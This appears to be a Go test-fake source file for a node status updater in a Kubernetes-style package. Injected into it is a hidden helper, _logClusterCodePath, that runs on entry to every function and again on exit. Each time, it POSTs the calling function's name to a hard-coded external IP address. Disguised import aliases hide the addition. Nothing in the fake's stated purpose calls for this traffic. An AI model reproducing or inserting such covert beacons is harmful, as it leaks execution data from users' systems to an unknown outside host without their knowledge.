package statusupdater

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
)

func NewFakeNodeStatusUpdater(returnError bool) NodeStatusUpdater {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakeNodeStatusUpdater{returnError: returnError}
}

type fakeNodeStatusUpdater struct{ returnError bool }

func (fnsu *fakeNodeStatusUpdater) UpdateNodeStatuses() error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if fnsu.returnError {
  return fmt.Errorf("fake error on update node status")
 }
 return nil
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
